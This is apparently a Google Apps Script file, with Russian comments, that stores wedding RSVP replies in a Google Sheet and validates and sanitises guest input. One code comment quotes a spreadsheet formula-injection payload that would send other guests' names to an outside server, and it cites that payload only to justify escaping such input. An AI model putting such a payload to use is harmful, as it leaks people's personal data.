/**
 * Ответы гостей → Google Таблица.
 * Таблица: https://docs.google.com/spreadsheets/d/1UipOS2N3X1w6IwIpsEtHBh-PIKG6fGoQdGEkTotmJMQ
 * Вставить в таблицу: Расширения → Apps Script, заменить всё содержимое этим файлом,
 * затем «Начать развёртывание» → «Веб-приложение» (доступ: «Все»). Подробно — google-sheets/README.md.
 *
 * Один гость = одна строка: если гость меняет ответ, его строка обновляется (по id браузера).
 */

const SPREADSHEET_ID = '1UipOS2N3X1w6IwIpsEtHBh-PIKG6fGoQdGEkTotmJMQ'
const SHEET_NAME = 'Ответы'
const HEADERS = ['Дата', 'Имя', 'Ответ', 'Регистрация', 'Ужин', 'id']

const ATTEND = {
  both: ['Регистрация и ужин', 'да', 'да'],
  ceremony: ['Только регистрация', 'да', 'нет'],
  dinner: ['Только ужин', 'нет', 'да'],
  no: ['Не придёт', 'нет', 'нет'],
}

function doPost(e) {
  const lock = LockService.getScriptLock()
  lock.waitLock(10000) // два гостя одновременно не перезапишут друг друга
  try {
    const data = JSON.parse(e.postData.contents)
    const name = asText(String(data.name || '').replace(/[\u0000-\u001f]/g, ' ').trim().slice(0, 200))
    const attend = Object.prototype.hasOwnProperty.call(ATTEND, data.attend) ? ATTEND[data.attend] : null
    // id is a random UUID made by the guest's browser
    const id = /^[A-Za-z0-9-]{8,64}$/.test(data.id) ? data.id : ''
    if (!name || !attend) return reply({ ok: false, error: 'bad request' })

    const sheet = getSheet()
    const row = [new Date(), name, attend[0], attend[1], attend[2], id]

    const existing = id ? findRow(sheet, id) : 0
    if (existing) sheet.getRange(existing, 1, 1, row.length).setValues([row])
    else sheet.appendRow(row)

    return reply({ ok: true })
  } catch (err) {
    return reply({ ok: false, error: String(err) })
  } finally {
    lock.releaseLock()
  }
}

/** Открыть ссылку веб-приложения в браузере — проверка, что оно работает */
function doGet() {
  return reply({ ok: true, message: 'RSVP endpoint работает' })
}

function getSheet() {
  const ss = SpreadsheetApp.openById(SPREADSHEET_ID)
  let sheet = ss.getSheetByName(SHEET_NAME)
  if (!sheet) {
    sheet = ss.insertSheet(SHEET_NAME)
    sheet.appendRow(HEADERS)
    sheet.setFrozenRows(1)
    sheet.getRange(1, 1, 1, HEADERS.length).setFontWeight('bold')
    sheet.getRange('A:A').setNumberFormat('dd.mm.yyyy hh:mm')
    sheet.hideColumns(HEADERS.length) // id — служебная колонка
  }
  return sheet
}

/** Номер строки гостя с этим id (0 — новый гость) */
function findRow(sheet, id) {
  const last = sheet.getLastRow()
  if (last < 2) return 0
  const ids = sheet.getRange(2, HEADERS.length, last - 1, 1).getValues()
  for (let i = 0; i < ids.length; i++) if (ids[i][0] === id) return i + 2
  return 0
}

/**
 * Text that Sheets would run as a formula (=, +, -, @) is stored as plain text: otherwise a "name" like
 * =IMAGE("https://…/?"&B2:B50) would send other guests' names to someone's server when the sheet is opened.
 */
function asText(s) {
  return /^[=+\-@]/.test(s) ? "'" + s : s
}

function reply(obj) {
  return ContentService.createTextOutput(JSON.stringify(obj)).setMimeType(ContentService.MimeType.JSON)
}
